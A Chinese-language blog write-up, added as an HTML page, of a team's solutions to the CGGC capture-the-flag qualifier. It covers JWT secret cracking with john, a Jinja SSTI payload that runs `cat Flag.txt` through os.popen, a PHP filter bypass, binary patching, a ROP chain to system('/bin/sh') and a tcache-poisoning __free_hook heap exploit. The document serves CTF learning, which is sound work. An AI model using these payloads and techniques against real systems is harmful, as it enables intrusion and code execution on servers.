@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+
+<!--Description-->
+
+
+
+    <meta name="description" content="Team: 芙莉熊Rank: 9th
+
+Webbossti第一關是用jwt sign的登入頁面，把密鑰用john暴一下並修改參數登入就好：john jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256
+image  
+image  
+登入後的畫面上方"/>
+
+
+<!--Author-->
+
+    <meta name="author" content="Naup堇姬"/>
+
+
+<!--Open Graph Title-->
+
+    <meta property="og:title" content="CGGC 網路守護者挑戰賽 Qual Writeup"/>
+
+
+<!--Open Graph Description-->
+
+    <meta property="og:description" content="Team: 芙莉熊Rank: 9th
+
+Webbossti第一關是用jwt sign的登入頁面，把密鑰用john暴一下並修改參數登入就好：john jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256
+image  
+image  
+登入後的畫面上方"/>
+
+
+<!--Open Graph Site Name-->
+    <meta property="og:site_name" content="堇姬 Naup&#39;s Blog"/>
+
+<!--Type page-->
+
+    <meta property="og:type" content="article"/>
+
+
+<!--Page Cover-->
+
+
+    <meta property="og:image" content="http://example.com/img/bg.jpg"/>
+
+
+<meta name="twitter:card" content="summary_large_image"/>
+
+
+
+
+    <meta name="twitter:image" content="http://example.com/img/bg.jpg"/>
+
+
+<!-- Title -->
+
+<title>CGGC 網路守護者挑戰賽 Qual Writeup | 堇姬 Naup&#39;s Blog</title>
+
+<!-- Bootstrap Core CSS -->
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/css/bootstrap.min.css">
+
+<!-- Custom CSS -->
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<!-- Custom Fonts -->
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.0/css/all.min.css" />
+<link href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css"/>
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.0/css/all.min.css" />
+<link href="//fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@100;300;400;500;700;900&display=swap" rel="stylesheet">
+<link href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css"/>
+
+<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+<!--[if lt IE 9]>
+<script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+<script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+<![endif]-->
+
+<!-- Gallery -->
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/featherlight@1.4.0/src/featherlight.css" integrity="sha256-30DV/STftlyQ6v8yaOWlabammvCYtRJERLj/m0b3zno=" crossorigin="anonymous">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/lightgallery@1.6.11/dist/css/lightgallery.min.css">
+
+<!-- favicon -->
+
+<link rel="icon" href="/img/icon.jpg"/>
+
+
+
+    <!-- Google Analytics -->
+    
+
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.1.1"></head>
+<!-- Head tag -->
+
+<body>
+
+    <!-- Menu -->
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top bg-transparent position-absolute w-100 p-0" id="nav">
+    <div class="container pl-0 pr-0">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <a class="navbar-brand text-white p-1 pl-3" href="/">堇姬 Naup's Blog</a>
+        </div>
+        <div class="navbar-nav float-right">
+            <button class="btn btn-link search-btn navbar-item" data-toggle="modal" data-target="#searchModal">
+                <i class="fas fa-search"></i>
+            </button>
+        </div>
+    </div>
+    <!-- /.container -->
+</nav>
+
+    <!-- Main Content -->
+    <!-- Page Header -->
+<!-- Set your background image for this header in your post front-matter: cover -->
+
+<header class="intro-header" style="background-image: url('/img/bg.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-12 col-md-12 text-center">
+                <div class="post-heading text-white">
+                    <h1>CGGC 網路守護者挑戰賽 Qual Writeup</h1>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <!-- Post Main Content -->
+            <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1">
+                
+                    <span class="meta d-inline-block">
+    
+    
+    <!-- Date -->
+    
+        <span class="post-meta-split">&nbsp;|&nbsp;</span>
+        <i class="far fa-calendar-check fa-fw"></i>
+        2024-02-29
+    
+    <!-- word count and read count -->
+    
+
+    
+
+    
+</span>  
+                
+                <blockquote>
+<p>Team: 芙莉熊<br>Rank: 9th</p>
+</blockquote>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="bossti"><a href="#bossti" class="headerlink" title="bossti"></a>bossti</h3><p>第一關是用jwt sign的登入頁面，把密鑰用john暴一下並修改參數登入就好：<br><code>john jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256</code></p>
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/r1j-ZR_Hp.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/r1j-ZR_Hp.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div>  </p>
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/SkJ2bAOSa.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/SkJ2bAOSa.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div>  </p>
+<p>登入後的畫面上方有個<code>7*7</code>，馬上想到SSTI，結合前面JWT帶有的參數hack就可以植入payload:<br><code>&#123;&#123;config.__class__.__init__.__globals__['os'].popen('cat Flag.txt').read()&#125;&#125;</code>  </p>
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/BJTzzA_B6.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/BJTzzA_B6.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div><br>拿flag啦~</p>
+<h3 id="babyLFI-賽後解"><a href="#babyLFI-賽後解" class="headerlink" title="babyLFI(賽後解)"></a>babyLFI(賽後解)</h3><blockquote>
+<p>這題當下沒打出來是因為我在搞，100000打成1000000，結果噴錯說request太長，結果我就以為不是這樣做就沒做了</p>
+</blockquote>
+<p>首先他有一個網站以及他有給網站source code</p>
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/HJVuTLFra.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/HJVuTLFra.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>分析一下source code他用<code>$_REQUEST&#123;&#39;filename#&#39;&#125;</code>來接收使用者輸入，所以可以用<code>http://10.99.111.111:12345/index.php?filename%23=</code>這樣來接收輸入(記得#要urlencode，我忘記要用結果被卡了好幾個小時)</p>
+<p>並且他有過濾掉php:&#x2F;&#x2F;filter，要想辦法繞過，才能用php:&#x2F;&#x2F;filter嘗試拿flag</p>
+<p>另外注意到phpinfo在docker run 起來時就會被rm掉，所以可以自己架一個來看php info有沒有東西<br><div class="img-item" data-src="https://hackmd.io/_uploads/Hkoy1DYBa.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/Hkoy1DYBa.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>在觀察phpinfo時我注意到PRCE限制為100000(哭阿，我打1000000，那時候沒有把他架起來QQ)，所以我可以把payload填充到長度100000，繞過php:&#x2F;&#x2F;filter過濾。<br><div class="img-item" data-src="https://hackmd.io/_uploads/SJsb68Fr6.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/SJsb68Fr6.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>繞過後直接用php:&#x2F;&#x2F;info構造payload就可以拿到flag</p>
+<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Gaoyi"><a href="#Gaoyi" class="headerlink" title="Gaoyi"></a>Gaoyi</h3><p>把所有判斷都 Patch 掉，跳到輸出 flag 的部分就好<br><div class="img-item" data-src="https://hackmd.io/_uploads/H1NVsTdS6.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/H1NVsTdS6.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><blockquote>
+<p>[name&#x3D;Aukro]<br>腳本很醜 等修整好再丟上來</p>
+</blockquote>
+<hr>
+<h3 id="gift"><a href="#gift" class="headerlink" title="gift"></a>gift</h3><blockquote>
+<p>送了一個大大大禮包<br>可以做記憶體任意寫<br>後來仔細想想如果多利用一下這邊的話可能可以更簡單<br>但我打的時候就只有單純的堆rop</p>
+</blockquote>
+<ul>
+<li>Partail RELRO</li>
+</ul>
+<p>首先我先把<code>__stack_chk_fail</code> hijack 成<code>main</code>的<code>leave ret</code><br>這樣就可以忽視stack canary </p>
+<h2 id="接下來我堆的是也就是puts-putsgotplt-gets-buf1-這樣就可以leak-libc-並且達到stack-migration繼續開點剛剛的gets的-downarrow-system-bin-sh-getshell"><a href="#接下來我堆的是也就是puts-putsgotplt-gets-buf1-這樣就可以leak-libc-並且達到stack-migration繼續開點剛剛的gets的-downarrow-system-bin-sh-getshell" class="headerlink" title="接下來我堆的是也就是puts(putsgotplt); gets(buf1)這樣就可以leak libc, 並且達到stack migration繼續開點剛剛的gets的$\downarrow$system(&#x2F;bin&#x2F;sh)&gt; getshell"></a>接下來我堆的是<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rdi,</span><br><span class="line">putsplt</span><br><span class="line">putsgotplt</span><br><span class="line">rdi</span><br><span class="line">buf1</span><br><span class="line">getsplt</span><br><span class="line">rsi_r13_r14_r15_ret</span><br><span class="line">buf1</span><br></pre></td></tr></table></figure><br>也就是<code>puts(putsgotplt); gets(buf1)</code><br>這樣就可以leak libc, 並且達到stack migration繼續開點<br>剛剛的gets的$\downarrow$<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh</span><br><span class="line">0</span><br><span class="line">0</span><br><span class="line">rdi</span><br><span class="line">buf1 </span><br><span class="line">ret //this is for alignment</span><br><span class="line">system</span><br></pre></td></tr></table></figure><br>system(&#x2F;bin&#x2F;sh)<br>&gt; getshell</h2><h3 id="note"><a href="#note" class="headerlink" title="note"></a>note</h3><blockquote>
+<p>經典的heap note題<br>這次屬於沒有UAF的類型<br>但輸入可以off-by-one, 打Tcache positioning 最後打__free_hook<br>雖然這個off-by-one我找了一段時間</p>
+</blockquote>
+<p>1. </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(0,0x18)</span><br><span class="line">add(1,0x18)</span><br><span class="line">add(2,0x18)</span><br><span class="line">add(3,0x18)</span><br></pre></td></tr></table></figure>
+<p>$0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$2\ at\ 0x2d0$<br>$3\ at\ 0x2f0$</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">delete(3)</span><br><span class="line">delete(2)</span><br></pre></td></tr></table></figure>
+<p>$0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</p>
+<p><code>----------------------------------IAMSPLITLINE----------------------------------------</code><br>2. </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">edit(0,b&#x27;a&#x27;*0x18+b&#x27;\x51&#x27;)</span><br><span class="line">delete(1)</span><br><span class="line">add(4,0x48)</span><br></pre></td></tr></table></figure>
+<p>chunk_1.size &#x3D; 0x50<br>free&amp;melloc拿回來 <strong>ind變成4</strong> &#x2F;&#x2F;其實好像可以用1</p>
+<p>現在heap是<br>$0\ at\ 0x290$<br>$1\ at\ 0x2b0~0x2f0$<br>$2\ at\ 0x2d0(freed)$<br>$3\ at\ 0x2f0(freed)$<br>且$T_{0x20}\rightarrow 2 \rightarrow 3$ 所以如果想要的話這裡可以拿chunk2的fd, key來leak heap, Tcache entry<br><code>----------------------------------IAMSPLITLINE----------------------------------------</code><br>3.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add(1,0x18)</span><br><span class="line">edit(4,flat(0xdeabeef)*3 + flat(0x421, 0, 0))</span><br><span class="line">make_chunk0x420_ligal()</span><br><span class="line">add(5,0x28)</span><br><span class="line">add(2,0x28)</span><br><span class="line">add(3,0x28)</span><br><span class="line">delete(1)</span><br></pre></td></tr></table></figure>
+<p>下一步驟我們要libc所以需要創造unsortedbin<br>我們完全overlap的是freed掉的2<br>所以我們現在把它拿回來 (now it’s idx &#x3D; 1)<br>然後把他的size改成0x420 &gt; T_cache_maxSize<br>然後確保他是個合法的chunk並且不會被merge as<code>0x420,chunk, chunk, top chunk</code><br>後面三個0x28是後面unsorted bin壞掉 我懶得修 所以乾脆在他壞掉前先malloc就不用擔心這問題了<br>free掉 這時候$unsorted\ bin \rightarrow chunk\ 1\ at\ 0x2d0$<br>且$T_{0x20} \rightarrow 3$<br><code>----------------------------------IAMSPLITLINE----------------------------------------</code><br>4.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">padd = flat(0xdeadbeefdeadbeef)*3+b&#x27;abcdefgh&#x27;</span><br><span class="line">edit(4,padd)</span><br><span class="line">getinfo(show(4))</span><br></pre></td></tr></table></figure>
+<p>注意到現在可控的chunk 4在0x2b0 有0x48可寫<br>chunk 1在0x2d0<br>所以我們把chunk4填滿讓他不要有nullbyte直到overwrite 0x421<br>這樣就會剛好只把有libc資訊的那的蓋掉第一byte 並印出<br>這樣並不會影響我們計算libc base<br><code>----------------------------------IAMSPLITLINE----------------------------------------</code><br>5.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">delete(6_from_getinfo)</span><br><span class="line">edit(5,b&#x27;a&#x27;*0x28+b&#x27;\x51&#x27;)</span><br><span class="line">delete(3)</span><br><span class="line">delete(2)</span><br></pre></td></tr></table></figure>
+<p>6是一個0x30的chunk<br>現在5,3,2是alocated chunk<br>然後分別在0x730, 0x790, 0x760<br>用5把2的size改成0x50<br>2 free掉 進$T_{0x50}$<br>3 free掉 進$T_{0x30}$<br>現在重要的是<br>$T_{0x50} \rightarrow 2$<br>$T_{0x30} \rightarrow 3 \rightarrow 6$(cnt  &#x3D;2 )</p>
+<p><code>----------------------------------IAMSPLITLINE----------------------------------------</code><br>6.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(1,0x48)</span><br><span class="line">edit(1,flat(0,0,0,0,0,0x31,free_hook,0xdeadbeef))</span><br><span class="line">add(2,0x28)</span><br></pre></td></tr></table></figure>
+<p>真正的重點<br>現在把2拿出來 (0x760~0x7a0)<br>可以改到3(0x790)<br>重點是 <strong>fd改成free_hook, key改掉</strong><br>所以呢現在<br>$T_{0x30} \rightarrow 3 \rightarrow &amp;__free_hook$(cnt&#x3D;2)<br>把3拿出來</p>
+<p><code>----------------------------------IAMSPLITLINE----------------------------------------</code><br>7.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(3,0x28)</span><br><span class="line">edit(3,flat(system))</span><br><span class="line">edit(2,b&#x27;/bin/sh\x00&#x27;)</span><br></pre></td></tr></table></figure>
+<p>$T_{0x30}  \rightarrow &amp;__free_hook$(cnt&#x3D;1)<br>再malloc一次就會拿出 <code>__free_hook</code><br>把<code>__free_hook</code>的內容寫上<code>__libc_system</code><br>然後再任意的allocated chunk寫上<code>/bin/sh</code> 這裡選擇2</p>
+<p><code>----------------------------------IAMSPLITLINE----------------------------------------</code><br>8.<br>free(2) &#x3D;&#x3D; system(&#x2F;bin&#x2F;sh)</p>
+<blockquote>
+<p>getshell</p>
+</blockquote>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Space-game"><a href="#Space-game" class="headerlink" title="Space game"></a>Space game</h3><p>在網頁上拿到 <code>game.gb</code> 檔案，再用 GameBoy Emulator 把遊戲跑起來，用 Cheat Engine 修改擊敗敵人的數量 (&gt;30) 抵達終點就會有 flag</p>
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/SysitT_rT.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/SysitT_rT.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+
+            </div>
+
+            <!-- Post information -->
+            
+            
+    <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1">
+        <ul class="pagination d-block text-center">
+            
+                <li class="previous page-item d-inline"><a href="/2024/02/29/AIS3-EOF-2024-Qual-WP/" class="page-link float-left">&larr;  Newer</a></li>
+            
+            
+                <li class="next page-item d-inline"><a href="/2024/02/29/Cake-CTF-2023-WP/" class="page-link float-right">Older  &rarr;</a></li>
+            
+        </ul>
+    </div>
+
+
+            
+                <!-- Comments -->
+                
+
+                
+
+            
+
+        </div>
+    </div>
+</article> 
+
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    <style>
+        #toc-content .toc-link::before {
+            background-color: transparent;
+            max-height: 25px;
+        }
+
+        #toc-content .toc-link.is-active-link::before {
+            background-color: #404040;
+        }
+    </style>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <div class="ui-toc dropup scrollspy-body pull-right" style="right: 3%;">
+        <button type="button" class="toc-btn btn btn-light" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" data-display="static">
+            <i class="fas fa-list"></i>
+        </button>
+        <div class="dropdown-menu dropdown-menu-right p-2"  aria-labelledby="tocLabel">
+            <div class="toc-widget">
+                <div id="toc-content" class="text-truncate">
+                </div>
+            </div>
+            <div class="toc-menu pt-3 pl-4">
+                <a class="expand-toggle d-block py-1" href="#"><span class="expand-text">Expand all</span><span class="close-text" style="display: none;">Collapse all</span></a>
+                <a class="back-to-top d-block py-1" href="#">Back to top</a>
+                <a class="go-to-bottom d-block py-1" href="#">Go to bottom</a>
+            </div>
+        </div>
+    </div>
+    <script>
+        tocbot.init({
+            // Where to render the table of contents.
+            tocSelector: '#toc-content',
+            // Where to grab the headings to build the table of contents.
+            contentSelector: 'article',
+            // Which headings to grab inside of the contentSelector element.
+            headingSelector: 'h1, h2, h3',
+            // For headings inside relative or absolute positioned containers within content.
+            hasInnerContainers: true,
+        });
+    </script>
+
+
+    
+
+
+    <!-- Footer -->
+    <hr />
+
+<!-- Footer -->
+<footer id="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1 text-center">
+                <ul class="list-inline">
+                    
+
+                    
+
+                    
+                        <li class="list-inline-item">
+                            <a rel="external" href="https://github.com/Naupjjin" target="_blank">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                    
+
+                    
+
+                    
+                        <li class="list-inline-item">
+                            <a rel="external" href="mailto:naup96721@gmail.com" target="_blank">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="far fa-envelope fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                    
+
+                    
+                </ul>
+                <ul class="copyright footer-menu list-inline">
+                    
+                    
+                        <li class="list-inline-item">
+                            
+                            
+                            <a href="/">
+                                
+                                    Home
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/archives">
+                                
+                                    Archives
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/tags">
+                                
+                                    Tags
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/categories">
+                                
+                                    Categories
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/about">
+                                
+                                    About
+                                
+                            </a>
+                        </li>
+                    
+                </ul>
+                <p class="copyright footer-author">
+                    &copy; -2024 
+                    <a rel="external" class="copyright-link" href="" target="_blank">Naup堇姬</a><br/>
+                    Powered by <a rel="external" class="copyright-link" href="https://hexo.io/" target="_blank">Hexo</a>  
+                    <span class="copyright-split">&nbsp;|&nbsp;&nbsp;</span>
+                    Theme <a rel="external" class="copyright-link" href="https://github.com/luswdev/hexo-theme-clean.git" target="_blank">Clean</a>
+                    
+                    
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+    <!-- After footer scripts -->
+    <!-- jQuery -->
+<script src="//cdn.jsdelivr.net/npm/jquery@2.1.4/dist/jquery.min.js"></script>
+
+<!-- For drop down -->
+<script src="//cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script>
+
+<!-- Bootstrap -->
+<script src="//cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/js/bootstrap.min.js"></script>
+<!-- Gallery -->
+<script src="//cdn.jsdelivr.net/npm/lightgallery@1.6.11/dist/js/lightgallery-all.min.js"></script>
+<!-- Busuanzi -->
+
+
+<!-- Search script -->
+
+<script src="/js/search.js"></script>
+
+<script type="text/javascript">
+    $(function () {
+        searchFunc( '/search.xml' , 'searchInput', 'searchResult');
+    });
+</script>
+
+
+
+<script src="/js/main.js"></script>
+
+
+
+    <!-- Search Modal -->
+    <!-- Modal -->
+<div class="modal fade" id="searchModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
+    <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+        <div class="modal-content overflow-auto">
+            <div class="modal-header">
+                <input type="text" class="form-control" placeholder="Searching Keywords..." id="searchInput">
+                <button type="button" class="close" data-dismiss="modal" aria-label="Close"><i class="fas fa-times"></i></button>
+            </div>
+            <div class="modal-body">
+                <div id="searchResult">
+                    <div class="search-empty text-center text-muted p-5">
+                        <i class="far fa-meh"></i>
+                    </div>
+                </div>
+            </div> 
+        </div>
+    </div>
+</div>
+
+
+</body>
+</html>
